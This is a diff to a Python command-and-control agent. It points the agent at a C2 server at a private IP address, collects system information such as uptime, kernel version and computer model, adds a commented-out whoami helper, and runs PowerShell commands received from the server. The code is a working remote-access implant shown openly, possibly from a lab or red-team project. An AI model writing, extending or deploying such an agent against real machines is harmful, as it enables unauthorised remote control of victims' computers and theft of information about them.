@@ -10,7 +10,7 @@ import win32com.client
 import os
 
 # URL of the C2 server
-SERVER_URL = "http://192.168.30.20:5000"
+SERVER_URL = "http://192.168.31.132:5000"
 
 # Generate a unique agent ID
 AGENT_ID = str(uuid.uuid4())
@@ -83,6 +83,17 @@ def get_computer_model_with_com():
     except Exception as e:
         return f"Error: {e}"
 
+# def run_whoami():
+#     """Execute the whoami command in PowerShell and return the result."""
+#     try:
+#         result = subprocess.run(
+#             ['powershell', '-Command', 'whoami'],
+#             capture_output=True, text=True, check=True
+#         )
+#         return result.stdout.strip()
+#     except subprocess.CalledProcessError as e:
+#         return f"Error: {e}"
+
 def get_system_info():
     """Collect detailed system information."""
     system_info = {
@@ -94,6 +105,7 @@ def get_system_info():
         'uptime': format_uptime(time.time() - psutil.boot_time()),  # Convert to readable uptime
         'kernel_version': platform.release(),
         'model': get_computer_model_with_com(),
+        # 'current_user': run_whoami(),
     }
 
     # CPU info
@@ -176,7 +188,7 @@ def execute_command(command):
     
     try:
         # Execute the command and capture the output
-        result = subprocess.run(["powershell", "-Command", command], shell=True, capture_output=True, text=True)
+        result = subprocess.run(["powershell", "-Command", command], shell=True, capture_output=True, text=True, check=True)
         output = result.stdout
     except subprocess.CalledProcessError as e:
         # If the command fails, capture the error output
